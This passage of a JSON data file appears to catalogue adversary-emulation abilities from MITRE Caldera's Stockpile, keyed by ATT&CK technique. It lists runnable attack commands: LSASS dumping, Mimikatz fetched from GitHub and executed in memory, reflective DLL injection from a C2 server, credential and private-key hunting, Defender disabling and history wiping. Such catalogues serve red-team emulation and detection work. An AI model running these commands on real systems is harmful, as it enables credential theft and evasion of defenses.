if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}", "ps aux | grep #{host.user.name}", "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log", "ps aux", "Get-Process", "tasklist", "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1105", "commands": [{"source": "data/abilities/command-and-control/60f63260-39bb-4136-87a0-b6c2dca799fc.yml", "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n", "name": "Download, install and start new process under PowerShell Core 6"}, {"source": "data/abilities/command-and-control/eb814e03-811a-467a-bc6d-dcd453750fa2.yml", "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n", "name": "Download and install PSTools by unzipping the file"}], "parsed_datasets": [{"Mitre Stockpile - Download, install and start new process under PowerShell Core 6": {"id": "60f63260-39bb-4136-87a0-b6c2dca799fc", "name": "Install PowerShell Core 6", "description": "Download, install and start new process under PowerShell Core 6", "tactic": "command-and-control", "technique": {"attack_id": "T1105", "name": "Ingress Tool Transfer"}, "platforms": {"windows": {"psh": {"command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n", "cleanup": "rm PowerShellCore.msi;\n"}}}}}, {"Mitre Stockpile - Download and install PSTools by unzipping the file": {"id": "eb814e03-811a-467a-bc6d-dcd453750fa2", "name": "Install PSTools", "description": "Download and install PSTools by unzipping the file", "tactic": "command-and-control", "technique": {"attack_id": "T1105", "name": "Ingress Tool Transfer"}, "platforms": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"}}}}}], "command_list": ["$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;", "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1003.001", "commands": [{"source": "data/abilities/credential-access/0ef4cc7b-611c-4237-b20b-db36b6906554.yml", "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n", "name": "Dump lsass for later use with mimikatz"}], "parsed_datasets": [{"Mitre Stockpile - Dump lsass for later use with mimikatz": {"id": "0ef4cc7b-611c-4237-b20b-db36b6906554", "name": "Leverage Procdump for lsass memory", "description": "Dump lsass for later use with mimikatz", "tactic": "credential-access", "technique": {"attack_id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}, "platforms": {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}}}], "command_list": ["$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1040", "commands": [{"source": "data/abilities/credential-access/1b4fb81c-8090-426c-93ab-0a633e7a16a7.yml", "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};\n", "name": "Perform a packet capture"}, {"source": "data/abilities/credential-access/1b4fb81c-8090-426c-93ab-0a633e7a16a7.yml", "command": "tcpdump -i en0 & sleep 5; kill $!\n", "name": "Perform a packet capture"}], "parsed_datasets": [{"Mitre Stockpile - Perform a packet capture": {"id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "name": "Sniff network traffic", "description": "Perform a packet capture", "tactic": "credential-access", "technique": {"attack_id": "T1040", "name": "Network Sniffing"}, "privilege": "Elevated", "platforms": {"windows": {"psh": {"timeout": 80, "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};\n", "cleanup": "Remove-NetEventSession -Name \"PCAP\";\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl;\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}}}], "command_list": ["tcpdump -i en0 & sleep 5; kill $!", "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1552.002", "commands": [{"source": "data/abilities/credential-access/3aad5312-d48b-4206-9de4-39866c12e60f.yml", "command": "reg query HKCU /f password /t REG_SZ /s\n", "name": "Search for possible credentials stored in Registry"}], "parsed_datasets": [{"Mitre Stockpile - Search for possible credentials stored in Registry": {"id": "3aad5312-d48b-4206-9de4-39866c12e60f", "name": "Credentials in Registry", "description": "Search for possible credentials stored in Registry", "tactic": "credential-access", "technique": {"attack_id": "T1552.002", "name": "Unsecured Credentials: Credentials in Registry"}, "platforms": {"windows": {"psh": {"command": "reg query HKCU /f password /t REG_SZ /s\n"}}}}}], "command_list": ["reg query HKCU /f password /t REG_SZ /s"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1003", "commands": [{"source": "data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml", "command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "name": "Custom GO credential dumper using minidumpwritedump"}], "parsed_datasets": [{"Mitre Stockpile - Custom GO credential dumper using minidumpwritedump": {"id": "3c647015-ab0a-496a-8847-6ab173cd2b22", "name": "MiniDumpWriteDump (Spooky)", "description": "Custom GO credential dumper using minidumpwritedump", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "OS Credential Dumping"}, "platforms": {"windows": {"psh": {"command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "payloads": ["totallylegit.exe"], "cleanup": "if (Test-Path \"C:\\Users\\Public\\creds.dmp\") {\n  rm \"C:\\Users\\Public\\creds.dmp\" -Force;\n};\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.process.id"}]}]}}], "command_list": [".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1552.003", "commands": [{"source": "data/abilities/credential-access/422526ec-27e9-429a-995b-c686a29561a4.yml", "command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null", "name": "Get contents of bash history"}, {"source": "data/abilities/credential-access/422526ec-27e9-429a-995b-c686a29561a4.yml", "command": "cat ~/.bash_history", "name": "Get contents of bash history"}], "parsed_datasets": [{"Mitre Stockpile - Get contents of bash history": {"id": "422526ec-27e9-429a-995b-c686a29561a4", "name": "Dump history", "description": "Get contents of bash history", "tactic": "credential-access", "technique": {"attack_id": "T1552.003", "name": "Unsecured Credentials: Bash History"}, "platforms": {"darwin": {"sh": {"command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "cat ~/.bash_history", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}}}], "command_list": ["cat ~/.bash_history", "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1003.001", "commands": [{"source": "data/abilities/credential-access/7049e3ec-b822-4fdf-a4ac-18190f9b66d1.yml", "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "name": "Use Invoke-Mimikatz"}], "parsed_datasets": [{"Mitre Stockpile - Use Invoke-Mimikatz": {"id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", "name": "Powerkatz (Staged)", "description": "Use Invoke-Mimikatz", "tactic": "credential-access", "technique": {"attack_id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}, "privilege": "Elevated", "platforms": {"windows": {"psh": {"command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.ntlm"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.sha1"}]}, "payloads": ["invoke-mimi.ps1"]}}}}}], "command_list": ["Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1552.002", "commands": [{"source": "data/abilities/credential-access/98e58fc4-3843-4511-89b1-50cb872e0c9b.yml", "command": "reg query HKLM /f password /t REG_SZ /s\n", "name": "Search for possible credentials stored in the HKLM Hive"}], "parsed_datasets": [{"Mitre Stockpile - Search for possible credentials stored in the HKLM Hive": {"id": "98e58fc4-3843-4511-89b1-50cb872e0c9b", "name": "Credentials in Registry", "description": "Search for possible credentials stored in the HKLM Hive", "tactic": "credential-access", "technique": {"attack_id": "T1552.002", "name": "Unsecured Credentials: Credentials in Registry"}, "platforms": {"windows": {"psh": {"command": "reg query HKLM /f password /t REG_SZ /s\n"}}}}}], "command_list": ["reg query HKLM /f password /t REG_SZ /s"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1003.001", "commands": [{"source": "data/abilities/credential-access/baac2c6d-4652-4b7e-ab0a-f1bf246edd12.yml", "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n", "name": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords"}], "parsed_datasets": [{"Mitre Stockpile - Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords": {"id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", "name": "Run PowerKatz", "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords", "tactic": "credential-access", "technique": {"attack_id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}, "platforms": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}}}}}}], "command_list": ["[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1055.002", "commands": [{"source": "data/abilities/credential-access/c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7.yml", "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose", "name": "Injects cred dumper exe into an available process"}], "parsed_datasets": [{"Mitre Stockpile - Injects cred dumper exe into an available process": {"id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7", "name": "Inject Cred dumper into process (Spookier)", "description": "Injects cred dumper exe into an available process", "tactic": "credential-access", "technique": {"attack_id": "T1055.002", "name": "Process Injection: Portable Executable Injection"}, "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"}}}}}], "command_list": ["$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1552.004", "commands": [{"source": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml", "command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n", "name": "Find private keys on the file system"}, {"source": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml", "command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n", "name": "Find private keys on the file system"}, {"source": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml", "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n", "name": "Find private keys on the file system"}, {"source": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml", "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;", "name": "Find private keys on the file system"}], "parsed_datasets": [{"Mitre Stockpile - Find private keys on the file system": {"id": "de632c2d-a729-4b77-b781-6a6b09c148ba", "name": "Find private keys", "description": "Find private keys on the file system", "tactic": "credential-access", "technique": {"attack_id": "T1552.004", "name": "Unsecured Credentials: Private Keys"}, "platforms": {"windows": {"psh": {"command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"}, "cmd": {"command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"}}, "darwin": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"}}, "linux": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"}}}}}], "command_list": ["foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}", "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;", "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;", "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1497.003", "commands": [{"source": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml", "command": "sleep 60", "name": "Pause all operations to avoid making noise"}, {"source": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml", "command": "sleep 60", "name": "Pause all operations to avoid making noise"}, {"source": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml", "command": "sleep 60", "name": "Pause all operations to avoid making noise"}], "parsed_datasets": [{"Mitre Stockpile - Pause all operations to avoid making noise": {"id": "36eecb80-ede3-442b-8774-956e906aff02", "name": "1-min sleep", "description": "Pause all operations to avoid making noise", "tactic": "defense-evasion", "technique": {"attack_id": "T1497.003", "name": "Virtualization/Sandbox Evasion: Time Based Evasion"}, "platforms": {"darwin": {"sh": {"command": "sleep 60"}}, "linux": {"sh": {"command": "sleep 60"}}, "windows": {"psh": {"command": "sleep 60"}}}}}], "command_list": ["sleep 60"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1562.001", "commands": [{"source": "data/abilities/defense-evasion/3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e.yml", "command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")", "name": "Ensure the ExecutionPolicy is turned to Bypass"}], "parsed_datasets": [{"Mitre Stockpile - Ensure the ExecutionPolicy is turned to Bypass": {"id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e", "name": "Bypass ExecutionPolicy", "description": "Ensure the ExecutionPolicy is turned to Bypass", "tactic": "defense-evasion", "technique": {"attack_id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools"}, "platforms": {"windows": {"psh": {"command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"}}}}}], "command_list": ["Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1070.003", "commands": [{"source": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml", "command": "> $HOME/.bash_history && unset HISTFILE\n", "name": "Stop terminal from logging history"}, {"source": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml", "command": "> $HOME/.bash_history && unset HISTFILE\n", "name": "Stop terminal from logging history"}, {"source": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml", "command": "Clear-History;Clear", "name": "Stop terminal from logging history"}], "parsed_datasets": [{"Mitre Stockpile - Stop terminal from logging history": {"id": "43b3754c-def4-4699-a673-1d85648fda6a", "name": "Avoid logs", "description": "Stop terminal from logging history", "tactic": "defense-evasion", "technique": {"attack_id": "T1070.003", "name": "Indicator Removal on Host: Clear Command History"}, "platforms": {"darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "windows": {"psh": {"command": "Clear-History;Clear"}}}}}], "command_list": ["> $HOME/.bash_history && unset HISTFILE", "Clear-History;Clear"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1562.001", "commands": [{"source": "data/abilities/defense-evasion/49470433-30ce-4714-a44b-bea9dbbeca9a.yml", "command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};\n", "name": "Disable Windows Defender Real-Time Protection"}], "parsed_datasets": [{"Mitre Stockpile - Disable Windows Defender Real-Time Protection": {"id": "49470433-30ce-4714-a44b-bea9dbbeca9a", "name": "Disable Windows Defender Real-Time Protection", "description": "Disable Windows Defender Real-Time Protection", "tactic": "defense-evasion", "technique": {"attack_id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools"}, "privilege": "Elevated", "platforms": {"windows": {"psh": {"command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};\n", "cleanup": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) { Set-MPPreference -DisableRealtimeMonitoring 0; } else { $service = Get-Service WinDefend -ErrorAction SilentlyContinue; if ($service) { Start-Service WinDefend; } else { echo \"Windows Defender service not found.\"; exit 1; }; };"}}}}}], "command_list": ["if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1070.004", "commands": [], "parsed_datasets": [{"Mitre Stockpile - Remove a downloaded payload file": {"id": "4cd4eb44-29a7-4259-91ae-e457b283a880", "name": "Delete payload", "description": "Remove a downloaded payload file", "tactic": "defense-evasion", "technique": {"attack_id": "T1070.004", "name": "Indicator Removal on Host: File Deletion"}, "platforms": {"darwin": {"sh": {"cleanup": "rm #{payload}\n"}}, "linux": {"sh": {"cleanup": "rm #{payload}\n"}}, "windows": {"psh,pwsh": {"cleanup": "Remove-Item -Force -Path \"#{payload}\""}}}}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1055.002", "commands": [{"source": "data/abilities/defense-evasion/a398986f-31b0-436a-87e9-c8e82c028f3c.yml", "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n", "name": "Injects sandcat DLL into an available process"}], "parsed_datasets": [{"Mitre Stockpile - Injects sandcat DLL into an available process": {"id": "a398986f-31b0-436a-87e9-c8e82c028f3c", "name": "Inject Sandcat into process", "description": "Injects sandcat DLL into an available process", "tactic": "defense-evasion", "technique": {"attack_id": "T1055.002", "name": "Process Injection: Portable Executable Injection"}, "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object 